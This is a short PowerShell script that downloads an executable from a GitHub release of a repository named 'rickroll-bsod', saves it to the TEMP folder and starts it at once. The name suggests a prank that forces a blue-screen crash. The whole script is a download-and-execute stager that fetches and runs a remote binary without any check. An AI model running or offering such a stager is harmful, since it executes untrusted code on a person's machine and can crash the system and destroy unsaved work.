$url = "https://github.com/AGO061/rickroll-bsod/releases/download/first-version/rick_dist.exe"
$outputPath = "$env:TEMP\rick_dist.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath

Start-Process $outputPath